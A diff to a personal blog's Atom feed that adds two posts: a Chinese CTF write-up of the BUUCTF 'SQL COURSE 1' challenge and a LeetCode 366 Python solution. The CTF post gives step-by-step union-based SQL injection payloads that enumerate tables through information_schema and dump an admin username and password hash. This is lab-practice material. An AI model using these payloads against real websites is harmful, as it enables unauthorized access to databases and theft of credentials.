@@ -6,7 +6,7 @@
   <link href="https://ericlee12118.github.io/atom.xml" rel="self"/>
   
   <link href="https://ericlee12118.github.io/"/>
-  <updated>2023-07-26T08:42:40.070Z</updated>
+  <updated>2023-07-28T06:48:22.984Z</updated>
   <id>https://ericlee12118.github.io/</id>
   
   <author>
@@ -15,6 +15,52 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>BUUCTF SQL COURSE 1</title>
+    <link href="https://ericlee12118.github.io/posts/b05fabdc.html"/>
+    <id>https://ericlee12118.github.io/posts/b05fabdc.html</id>
+    <published>2023-07-28T05:54:20.000Z</published>
+    <updated>2023-07-28T06:48:22.984Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Write-Up">Write Up</h2><p>1.直接使用弱口令来进行测试<br><img src="https://cdn.jsdelivr.net/gh/EricLee12118/picture@main/buuctf/1.png" alt=""></p><p>2.通过Chrome抓包，发现了login.php,但查看响应信息并没有获取什么有价值的信息，说明这个是写死的注册和登录，看来关键点在于旁边的热点，继续f12发现果然如此<br><img src="https://cdn.jsdelivr.net/gh/EricLee12118/picture@main/buuctf/2.png" alt=""></p><p>3.访问该地址并尝试修改后面的id=1，2，3，发现均会返回信息，说明该接口直接使用SQL查询语句来返回数据<br><img src="https://cdn.jsdelivr.net/gh/EricLee12118/picture@main/buuctf/3.png" alt=""></p><p>4.尝试写入</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span></span><br></pre></td></tr></table></figure><p>没有任何回显，说明这里对sql的and语句没有过滤，可以开始尝试构造sql注入<br><img src="https://cdn.jsdelivr.net/gh/EricLee12118/picture@main/buuctf/4.png" alt=""></p><p>5.首先判断列数</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span>order by <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><p>3的时候没有回显，1，2有回显，说明有2列<br><img src="https://cdn.jsdelivr.net/gh/EricLee12118/picture@main/buuctf/5.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/EricLee12118/picture@main/buuctf/6.png" alt=""></p><p>6.判断显位点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/EricLee12118/picture@main/buuctf/7.png" alt=""></p><p>7.爆破数据库</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/EricLee12118/picture@main/buuctf/8.png" alt=""></p><p>8.得到数据库库名<code>news</code>，获取数据表信息</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">&#x27;news&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/EricLee12118/picture@main/buuctf/9.png" alt=""></p><p>9.得到表名信息<code>admin</code>,<code>contents</code>,使用<code>admin</code>表，获取字段名信息</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> table_schema=<span class="string">&#x27;news&#x27;</span> <span class="keyword">and</span> <span class="built_in">table_name</span>=<span class="string">&#x27;admin&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/EricLee12118/picture@main/buuctf/10.png" alt=""></p><p>10.得到字段名分别是<code>id</code>,<code>username</code>,<code>password</code>,获取<code>username</code>的信息</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> <span class="keyword">admin</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/EricLee12118/picture@main/buuctf/11.png" alt=""></p><p>11.获取password的信息</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">admin</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/EricLee12118/picture@main/buuctf/12.png" alt=""></p><p>12.通过上述SQL注入可以得到用户名和密码</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line"><span class="number">989</span>cfa28ed3eb257f37f4e<span class="number">50948d61a0</span></span><br></pre></td></tr></table></figure><p>13.此时在登录框中输入其用户名和密码，即可得到<code>flag</code><br><img src="https://cdn.jsdelivr.net/gh/EricLee12118/picture@main/buuctf/13.png" alt=""></p>]]></content>
+    
+    
+    <summary type="html">BUUCTF SQL COURSE 1</summary>
+    
+    
+    
+    <category term="CTF" scheme="https://ericlee12118.github.io/categories/CTF/"/>
+    
+    
+    <category term="进阶" scheme="https://ericlee12118.github.io/tags/%E8%BF%9B%E9%98%B6/"/>
+    
+    <category term="SQL注入" scheme="https://ericlee12118.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>LeetCode 366 寻找二叉树的叶子节点</title>
+    <link href="https://ericlee12118.github.io/posts/96320e5.html"/>
+    <id>https://ericlee12118.github.io/posts/96320e5.html</id>
+    <published>2023-07-27T15:45:37.000Z</published>
+    <updated>2023-07-27T15:51:33.479Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="题目描述">题目描述</h2><p>给你一棵二叉树，请按以下要求的顺序收集它的全部节点：</p><ul><li>依次从左到右，每次收集并删除所有的叶子节点</li><li>重复如上过程直到整棵树为空</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">输入: [1,2,3,4,5]</span><br><span class="line">  </span><br><span class="line">          1</span><br><span class="line">         / \</span><br><span class="line">        2   3</span><br><span class="line">       / \     </span><br><span class="line">      4   5    </span><br><span class="line"></span><br><span class="line">输出: [[4,5,3],[2],[1]]</span><br></pre></td></tr></table></figure><h2 id="解题思路">解题思路</h2><p>根据题意，一层层将叶子节点删除，叶子节点被删除后其父节点会变为叶子节点，所以我们需要自底向上递归来记录每个节点离叶子节点的高度，将不同深度的节点放入对应的集合即可。</p><h2 id="代码">代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, left=None, right=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.left = left</span></span><br><span class="line"><span class="comment">#         self.right = right</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findLeaves</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        dic = collections.defaultdict(<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">root</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> root: </span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            l,r = dfs(root.left),dfs(root.right)</span><br><span class="line">            d = <span class="built_in">max</span>(l, r) + <span class="number">1</span></span><br><span class="line">            dic[d-<span class="number">1</span>].append(root.val)</span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line">        </span><br><span class="line">        dep = dfs(root)</span><br><span class="line">        <span class="keyword">return</span> [dic[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(dep)]</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+    <summary type="html">LeetCode 366 寻找二叉树的叶子节点</summary>
+    
+    
+    
+    <category term="算法" scheme="https://ericlee12118.github.io/categories/%E7%AE%97%E6%B3%95/"/>
+    
+    
+    <category term="二叉树" scheme="https://ericlee12118.github.io/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
+    
+    <category term="深度优先搜索" scheme="https://ericlee12118.github.io/tags/%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/"/>
+    
+  </entry>
   
   <entry>
     <title>BUUCTF BRUTE</title>
